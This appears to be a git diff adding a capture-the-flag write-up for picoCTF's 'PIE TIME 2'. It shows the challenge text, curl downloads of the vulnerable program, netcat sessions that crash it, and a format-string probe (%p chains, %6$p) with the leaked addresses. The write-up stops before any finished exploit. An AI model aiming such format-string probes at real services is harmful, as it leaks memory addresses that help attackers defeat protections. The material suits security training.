@@ -1,0 +1,28 @@
+# PIE TIME 2
+
+Can you try to get the flag? I'm not revealing anything anymore!!
+Additional details will be available after launching your challenge instance.
+
+```md
+Connect to the program with netcat:
+$ nc rescued-float.picoctf.net 57266
+The program's source code can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/a46e1331e4c897a4bed0f61714f2897d3aeba658ca3cc54e39f213bff453b495/vuln.c). The binary can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/a46e1331e4c897a4bed0f61714f2897d3aeba658ca3cc54e39f213bff453b495/vuln).
+```
+
+## Solution
+
+```sh
+curl https://challenge-files.picoctf.net/c_rescued_float/a46e1331e4c897a4bed0f61714f2897d3aeba658ca3cc54e39f213bff453b495/vuln.c -O
+curl https://challenge-files.picoctf.net/c_rescued_float/a46e1331e4c897a4bed0f61714f2897d3aeba658ca3cc54e39f213bff453b495/vuln -O
+➜  PIE TIME 2 git:(main) ✗ nc rescued-float.picoctf.net 57266
+# Enter your name:sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
+# sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss enter the address to jump to, ex => 0x12345: Segfault Occurred, incorrect address.
+➜  PIE TIME 2 git:(main) ✗ nc rescued-float.picoctf.net 57266                                                                                               
+# Enter your name:sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss  
+# sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss enter the address to jump to, ex => 0x12345: sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
+# Segfault Occurred, incorrect address.
+```
+
+> %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+> %6$p
+> 0x61ac6a7f32a1.(nil).0x61ac6a7f32d9.0x7ffdd9d61130.0x7c.0x750e90e49238.0x750e90e3b6a0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x7ffdd9d6000a.0x61ac588d81c0.0xd4433dc2e7807400.0x7ffdd9d61190.0x61ac588d8441
